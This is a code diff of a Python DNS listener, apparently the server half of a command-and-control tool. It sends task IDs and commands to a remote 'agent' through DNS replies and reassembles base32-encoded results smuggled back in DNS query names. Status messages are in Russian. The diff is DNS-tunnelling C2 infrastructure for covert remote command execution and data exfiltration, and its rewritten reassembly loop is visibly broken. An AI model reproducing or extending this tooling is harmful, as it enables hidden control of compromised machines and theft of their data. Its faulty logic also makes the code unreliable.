@@ -7,19 +7,6 @@ def decode_base32(data :str) -> str:
     pass
     return ""
 
-def receiv_result(s :socket.socket) -> str:
-    domain_tmp = {}
-    while True:
-        data, address = s.recvfrom(1024)
-        if data[:-21][-3:] != "end":
-            domain_tmp[999] = data[:-24]
-            break
-        
-        domain_tmp[data[:-21][-2:]] = data[:-24]
-
-    result = [domain_tmp[i] for i in sorted(domain_tmp.keys())]
-    return "".join(result)
-
 
 def run_dns(stop_event, task_manager):
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0) as s:
@@ -49,6 +36,7 @@ def run_dns(stop_event, task_manager):
                     if task is None:
                         ans = b"null"
                     else:
+                        #task[0] - task_id, task[1] - task_command
                         ans = f"{task[0]}|{task[1]}|".encode('utf-8')
                         print("[+/DNS]Задача отправлена агенту.")
 
@@ -79,16 +67,29 @@ def run_dns(stop_event, task_manager):
                     connection.close()
 
             elif domain[:-16][-1:] == "r":
+                result_tmp = {}
+                task_id = domain[:-18][-2:]
+
+                while True:
+                    if domain[:-21][-3:] == "end":
+                        break
+                    result_tmp[domain[:-21][-2:]] = domain[:-24]
+                    domain = s.recvfrom(1024)
+
+                result_tmp[999] = domain[:-25]
+                
+                result_base32_tmp = [result_tmp[i] for i in sorted(result_tmp.keys())]
+                result_base32 = "".join(result_base32_tmp)
+
+                #result = decode_base32(result_base32)
+                
                 connection = task_manager.get_connection()
-                result_base32 = receiv_result(s)
-                result = decode_base32(result_base32)
 
                 try:
-                    pass
-
+                    task_manager.complete_task(connection, task_id, result_base32)
+                    
+                    print(f"[+/DNS] Получен результат по задаче ({task_id}).")
                 finally:
                     connection.close()
-
-                pass
 
     print("[+/DNS] dns-слушатель прекратил работу.")
